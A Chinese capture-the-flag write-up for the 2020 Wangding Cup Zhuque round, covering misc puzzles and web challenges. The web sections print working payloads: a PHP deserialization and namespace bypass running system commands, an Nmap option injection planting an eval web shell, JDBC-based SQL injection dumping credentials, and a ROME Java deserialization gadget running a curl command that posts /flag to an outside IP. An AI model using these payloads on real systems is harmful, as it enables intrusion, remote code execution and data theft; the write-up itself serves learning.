> 原文链接: https://www.anquanke.com//post/id/205679 


# 2020网鼎杯朱雀组部分Web题wp


                                阅读量   
                                **505834**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">2</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p5.ssl.qhimg.com/t01d4dc41cbcf4137ba.jpg)](https://p5.ssl.qhimg.com/t01d4dc41cbcf4137ba.jpg)



## 前言

记录下网鼎杯第三场朱雀组的wp，主要是web。



## Misc

### <a class="reference-link" name="%E7%AD%BE%E5%88%B0"></a>签到

日常做游戏得到flag

### <a class="reference-link" name="%E4%B9%9D%E5%AE%AB%E6%A0%BC"></a>九宫格

打开压缩包 ，得到了好多的二维码

利用工具批量解码：

[![](https://s1.ax1x.com/2020/05/19/Y4wAzR.png)](https://s1.ax1x.com/2020/05/19/Y4wAzR.png)

发现结果都是0或者1

```
010101010011001001000110011100110110010001000111010101100110101101011000001100010011100101101010010101000110100001111000010101110111000101001011011011010101100101010100010110100101000000110001010110000011010001000001011001100111010101000110010010100010111100110111010001100110110001110001010010010100011000110001010010110100100001010001010101000101001000110101010100110011011000110011011110100100111101101011011110010110111101011000001100110011011001101110010110100110110001100001010011110111000100110100010110000011010001101011011011000111011101010010011101110111000101100001
```

猜测是二进制 八位一组转字符串

```
aa = '010101010011001001000110011100110110010001000111010101100110101101011000001100010011100101101010010101000110100001111000010101110111000101001011011011010101100101010100010110100101000000110001010110000011010001000001011001100111010101000110010010100010111100110111010001100110110001110001010010010100011000110001010010110100100001010001010101000101001000110101010100110011011000110011011110100100111101101011011110010110111101011000001100110011011001101110010110100110110001100001010011110111000100110100010110000011010001101011011011000111011101010010011101110111000101100001'

res=''
for i in range(0,len(aa),8):
    # print aa[i:i+8]
    res += chr(int(aa[i:i+8],2))

print res
```

结果为：<br>`U2FsdGVkX19jThxWqKmYTZP1X4AfuFJ/7FlqIF1KHQTR5S63zOkyoX36nZlaOq4X4klwRwqa`

百度一下，发现可是能rabbit加密

根据提示得到密钥为`245568`

[![](https://s1.ax1x.com/2020/05/19/Y402jI.png)](https://s1.ax1x.com/2020/05/19/Y402jI.png)

### <a class="reference-link" name="key"></a>key

修改图片的高度，得到一串神奇的字符串：

[![](https://s1.ax1x.com/2020/05/19/Y4aXDK.png)](https://s1.ax1x.com/2020/05/19/Y4aXDK.png)

`295965569a596696995a9aa969996a6a9a669965656969996959669566a5655699669aa5656966a566a56656`

不知道有什么用。。。 后来听说是 差分曼彻斯特编码

[![](https://s1.ax1x.com/2020/05/19/Y422vD.png)](https://s1.ax1x.com/2020/05/19/Y422vD.png)

得到密码：`Sakura_Love_Strawberry`

另一个图片 foremost得到一个压缩包。。

解压就可以得到flag了。。。



## web

### <a class="reference-link" name="webphp"></a>webphp

打开页面发现：

[![](https://s1.ax1x.com/2020/05/17/Y2uTyV.png)](https://s1.ax1x.com/2020/05/17/Y2uTyV.png)

发现没有什么东西，就是一个时间获取的界面。。

进行抓包，发现了 可以参数：

[![](https://s1.ax1x.com/2020/05/18/YhOBmq.png)](https://s1.ax1x.com/2020/05/18/YhOBmq.png)

感觉是php代码执行…

尝试发现存在waf，过滤了好多危险函数：

```
exec,shell_exec,system,phpinfo,eval,assert 等等
```

<a class="reference-link" name="%E6%96%B9%E6%B3%95%E4%B8%80"></a>**方法一**

忽然发现能够读到源码`file_get_contents`

[![](https://s1.ax1x.com/2020/05/18/YhO4n1.png)](https://s1.ax1x.com/2020/05/18/YhO4n1.png)

index.php

```
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;phpweb&lt;/title&gt;
    &lt;style type="text/css"&gt;
        body `{`
            background: url("bg.jpg") no-repeat;
            background-size: 100%;
        `}`
        p `{`
            color: white;
        `}`
    &lt;/style&gt;
&lt;/head&gt;

&lt;body&gt;
&lt;script language=javascript&gt;
    setTimeout("document.form1.submit()",5000)
&lt;/script&gt;
&lt;p&gt;
    &lt;?php
    $disable_fun = array("exec","shell_exec","system","passthru","proc_open","show_source","phpinfo","popen","dl","eval","proc_terminate","touch","escapeshellcmd","escapeshellarg","assert","substr_replace","call_user_func_array","call_user_func","array_filter", "array_walk",  "array_map","registregister_shutdown_function","register_tick_function","filter_var", "filter_var_array", "uasort", "uksort", "array_reduce","array_walk", "array_walk_recursive","pcntl_exec","fopen","fwrite","file_put_contents");
    function gettime($func, $p) `{`
        $result = call_user_func($func, $p);
        $a= gettype($result);
        if ($a == "string") `{`
            return $result;
        `}` else `{`return "";`}`
    `}`
    class Test `{`
        var $p = "Y-m-d h:i:s a";
        var $func = "date";
        function __destruct() `{`
            if ($this-&gt;func != "") `{`
                echo gettime($this-&gt;func, $this-&gt;p);
            `}`
        `}`
    `}`
    $func = $_REQUEST["func"];
    $p = $_REQUEST["p"];

    if ($func != null) `{`
        $func = strtolower($func);
        if (!in_array($func,$disable_fun)) `{`
            echo gettime($func, $p);
        `}`else `{`
            die("Hacker...");
        `}`
    `}`
    ?&gt;
&lt;/p&gt;
&lt;form  id=form1 name=form1 action="index.php" method=post&gt;
    &lt;input type=hidden id=func name=func value='date'&gt;
    &lt;input type=hidden id=p name=p value='Y-m-d h:i:s a'&gt;
&lt;/body&gt;
&lt;/html&gt;
```

发现存在一个很强的黑名单，基本上过滤了已知的危险函数。。。

但是这个class有点意思：

```
function gettime($func, $p) `{`
        $result = call_user_func($func, $p);
        $a= gettype($result);
        if ($a == "string") `{`
            return $result;
        `}` else `{`return "";`}`
    `}`


    class Test `{`
        var $p = "Y-m-d h:i:s a";
        var $func = "date";
        function __destruct() `{`
            if ($this-&gt;func != "") `{`
                echo gettime($this-&gt;func, $this-&gt;p);
            `}`
        `}`
    `}`
```

没有对参数进行验证，可以进行绕过，

本地测试：

```
&lt;?php 

function gettime($func, $p) `{`
    $result = call_user_func($func, $p);
    $a= gettype($result);
    if ($a == "string") `{`
        return $result;
    `}` else `{`return "";`}`
`}`

class Test `{`
    var $p = "ls";
    var $func = "system";
    function __destruct() `{`
        if ($this-&gt;func != "") `{`
            echo gettime($this-&gt;func, $this-&gt;p);
        `}`
    `}`
`}`


$a = new Test();

echo serialize($a);
 ?&gt;
```

测试发现可以执行命令：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://s1.ax1x.com/2020/05/18/YhXgVP.png)

得到flag：

payload:`func=unserialize&amp;p=O:4:"Test":2:`{`s:1:"p";s:25:"cat $(find / -name flag*)";s:4:"func";s:6:"system";`}``

[![](https://s1.ax1x.com/2020/05/18/YhjAPO.png)](https://s1.ax1x.com/2020/05/18/YhjAPO.png)

<a class="reference-link" name="%E6%96%B9%E6%B3%95%E4%BA%8C"></a>**方法二**

命名空间绕过黑名单：

[![](https://s1.ax1x.com/2020/05/18/YhjcQJ.png)](https://s1.ax1x.com/2020/05/18/YhjcQJ.png)

最终payload:`func=system&amp;p=cat $(find / -name flag*)`

[![](https://s1.ax1x.com/2020/05/18/YhjOeI.png)](https://s1.ax1x.com/2020/05/18/YhjOeI.png)

### <a class="reference-link" name="Nmap"></a>Nmap

打开页面，发现是一个nmap扫描器：

[![](https://s1.ax1x.com/2020/05/18/YhvSfS.png)](https://s1.ax1x.com/2020/05/18/YhvSfS.png)

尝试之后发现能够进行一些扫描并记录扫描结果。。

nmap的一些参数的用法[参考文章](https://blog.csdn.net/weixin_34221036/article/details/92148628)

尝试对扫描结果进行指定文件保存，

输入`' -oN aa.txt '`，让后访问`/aa.txt`

```
# Nmap 6.47 scan initiated Mon May 18 15:58:14 2020 as: nmap -Pn -T4 -F --host-timeout 1000ms -oX xml/05cc1 -oN aa.txt   \
```

于是猜测是否可以写一个木马文件上去,测试发现过滤了`php`字符串

可以上传`&lt;?=eval($_POST[a]);?&gt;` 文件名为`phtml`

payload：`' -oN b.phtml  &lt;?=eval($_POST[a]);?&gt;'`

用蚁剑进行连接，在根目录得到`flag`

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://s1.ax1x.com/2020/05/19/Y4psKg.png)

### <a class="reference-link" name="Think_Java"></a>Think_Java

发现给出了一定的源码，打开网站发现是这样的：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://s1.ax1x.com/2020/05/19/Y4Pl80.png)

反编译得到网站的部分源码：

主要代码：

test.java

```
package cn.abc.core.controller;

import cn.abc.common.bean.ResponseCode;
import cn.abc.common.bean.ResponseResult;
import cn.abc.common.security.annotation.Access;
import cn.abc.core.sqldict.SqlDict;
import io.swagger.annotations.ApiOperation;
import java.io.IOException;
import java.util.List;
import org.springframework.web.bind.annotation.CrossOrigin;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

@CrossOrigin
@RestController
@RequestMapping(`{`"/common/test"`}`)
public class Test `{`

   @PostMapping(`{`"/sqlDict"`}`)
   @Access
   @ApiOperation("为了开发方便对应数据库字典查询")
   public ResponseResult sqlDict(String dbName) throws IOException `{`
      List tables = SqlDict.getTableData(dbName, "root", "abc@12345");
      return ResponseResult.e(ResponseCode.OK, tables);
   `}`
`}`
```

sql.java

```
package cn.abc.core.sqldict;

import cn.abc.core.sqldict.Row;
import cn.abc.core.sqldict.Table;
import java.sql.Connection;
import java.sql.DatabaseMetaData;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;
import java.util.ArrayList;
import java.util.List;

public class SqlDict `{`

   public static Connection getConnection(String dbName, String user, String pass) `{`
      Connection conn = null;

      try `{`
         Class.forName("com.mysql.jdbc.Driver");
         if(dbName != null &amp;&amp; !dbName.equals("")) `{`
            dbName = "jdbc:mysql://mysqldbserver:3306/" + dbName;
         `}` else `{`
            dbName = "jdbc:mysql://mysqldbserver:3306/myapp";
         `}`

         if(user == null || dbName.equals("")) `{`
            user = "root";
         `}`

         if(pass == null || dbName.equals("")) `{`
            pass = "abc@12345";
         `}`

         conn = DriverManager.getConnection(dbName, user, pass);
      `}` catch (ClassNotFoundException var5) `{`
         var5.printStackTrace();
      `}` catch (SQLException var6) `{`
         var6.printStackTrace();
      `}`

      return conn;
   `}`

   public static List getTableData(String dbName, String user, String pass) `{`
      ArrayList Tables = new ArrayList();
      Connection conn = getConnection(dbName, user, pass);
      String TableName = "";

      try `{`
         Statement var16 = conn.createStatement();
         DatabaseMetaData metaData = conn.getMetaData();
         ResultSet tableNames = metaData.getTables((String)null, (String)null, (String)null, new String[]`{`"TABLE"`}`);

         while(tableNames.next()) `{`
            TableName = tableNames.getString(3);
            Table table = new Table();
            String sql = "Select TABLE_COMMENT from INFORMATION_SCHEMA.TABLES Where table_schema = '" + dbName + "' and table_name='" + TableName + "';";
            ResultSet rs = var16.executeQuery(sql);

            while(rs.next()) `{`
               table.setTableDescribe(rs.getString("TABLE_COMMENT"));
            `}`

            table.setTableName(TableName);
            ResultSet data = metaData.getColumns(conn.getCatalog(), (String)null, TableName, "");
            ResultSet rs2 = metaData.getPrimaryKeys(conn.getCatalog(), (String)null, TableName);

            String PK;
            for(PK = ""; rs2.next(); PK = rs2.getString(4)) `{`
               ;
            `}`

            while(data.next()) `{`
               Row row = new Row(data.getString("COLUMN_NAME"), data.getString("TYPE_NAME"), data.getString("COLUMN_DEF"), data.getString("NULLABLE").equals("1")?"YES":"NO", data.getString("IS_AUTOINCREMENT"), data.getString("REMARKS"), data.getString("COLUMN_NAME").equals(PK)?"true":null, data.getString("COLUMN_SIZE"));
               table.list.add(row);
            `}`

            Tables.add(table);
         `}`
      `}` catch (SQLException var161) `{`
         var161.printStackTrace();
      `}`

      return Tables;
   `}`
`}`
```

阅读完代码之后，发现可能存在sql注入：

test.class中发现，存在路由：`/common/test/sqlDict`

`dbName = "jdbc:mysql://mysqldbserver:3306/" + dbName;`

查看了jdbc的参考文档 [参考资料](https://www.cnblogs.com/maluscalc/p/12750720.html)

发现这个dbName可以传递参数。。dbName后面加上?后面可以加任意参数，也不会影响正常的数据库连接。。

这个sql语句 是利用单引号进行拼接：

```
String sql = "Select TABLE_COMMENT from INFORMATION_SCHEMA.TABLES Where table_schema = '" + dbName + "' and table_name='" + TableName + "';";
```

这里可以是一个注入点：`dbName=myapp?a=1' union select user()--+`

[![](https://s1.ax1x.com/2020/05/19/Y4MeSg.png)](https://s1.ax1x.com/2020/05/19/Y4MeSg.png)

发现存在回显：

爆表`dbName=myapp?a=1' union SELECT group_concat(table_name) from information_schema.tables where table_schema=database()--+`：

[![](https://s1.ax1x.com/2020/05/19/Y4MsfO.png)](https://s1.ax1x.com/2020/05/19/Y4MsfO.png)

爆字段名`dbName=myapp?a=1' union SELECT group_concat(id,name,pwd) from information_schema.columns where table_name='user'--+`：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://s1.ax1x.com/2020/05/19/Y4QijJ.png)

爆数据`dbName=myapp?a=1' union SELECT group_concat(id,name,pwd) from user--+`：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://s1.ax1x.com/2020/05/19/Y4QZAx.png)

得到了一组账号密码：`admin:admin[@Rrrr_ctf_asde](https://github.com/Rrrr_ctf_asde)`

没有找到想象中的flag。。。

扫目录发现存在`swagger-ui.html`文件：

[![](https://s1.ax1x.com/2020/05/19/Y4JTVH.png)](https://s1.ax1x.com/2020/05/19/Y4JTVH.png)

存在其他的功能测试。

有登陆功能，利用刚才爆破得到的账号密码进行登陆：

[![](https://s1.ax1x.com/2020/05/19/Y4YkR0.png)](https://s1.ax1x.com/2020/05/19/Y4YkR0.png)

得到了一个token

```
Bearer Token（Token 令牌）

定义：为了验证使用者的身份，需要客户端向服务器端提供一个可靠的验证信息，称为Token，这个token通常由Json数据格式组成，通过hash散列算法生成一个字符串，所以称为Json Web Token（Json表示令牌的原始值是一个Json格式的数据，web表示是在互联网传播的，token表示令牌，简称JWT)
```

在获取当前用户信息的那里需要输入token，应该是利用这个。。

[![](https://s1.ax1x.com/2020/05/19/Y4Y7OU.png)](https://s1.ax1x.com/2020/05/19/Y4Y7OU.png)

做到这里我就没什么思路了，一个大师傅告诉我，是java反序列化。。。

Bearer 属于jwt的一种，也就是说加密的字符是json数据通过base64加密后得到的。可以测试一下java的反序列化漏洞

用到的工具：Burp Suite的扩展 Java-Deserialization-Scanner[安装链接](https://www.cnblogs.com/yh-ma/p/10299289.html)

发现`ROME`可以成功：

[![](https://s1.ax1x.com/2020/05/19/Y4t2jK.png)](https://s1.ax1x.com/2020/05/19/Y4t2jK.png)

输入 `ROME "curl -d@/flag 174.1.96.95:5555"` 点击attack，

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://imgchr.com/i/Y4NC3q)

在服务器监听9999端口 就能接收到flag了

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://imgchr.com/i/Y4NMgx)



## 总结

尝试了java反序列化的操作，虽然是利用工具，以后要认真学习一下。。

加油



## 参考链接

[nmap的操作](https://blog.csdn.net/weixin_34221036/article/details/92148628)

[jdbc参考资料](https://www.cnblogs.com/maluscalc/p/12750720.html)

[Java-Deserialization-Scanner安装链接](https://www.cnblogs.com/yh-ma/p/10299289.html)
